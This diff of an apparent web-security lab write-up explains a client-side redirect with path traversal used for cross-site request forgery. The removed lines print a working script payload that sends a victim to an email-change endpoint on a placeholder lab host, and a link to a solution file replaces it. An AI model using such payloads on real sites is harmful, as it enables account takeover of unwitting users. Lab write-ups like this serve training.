@@ -37,12 +37,9 @@ We abuse this code to conduct a Local File Inclusion (LFI), sending the user to 
 required by the API. The victim visits our exploit server, makes a GET request to this crafted URL,
 travels to /post/comment/confirmation and then is redirected to /my-account/change-email.
 
-Below is the CSRF HTML payload we use to solve this lab:
 
+<a href="8.txt">Solution</a>
 
-<script>
-  document.location = "https://<LAB-ID>.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
-</script>
 
 
 
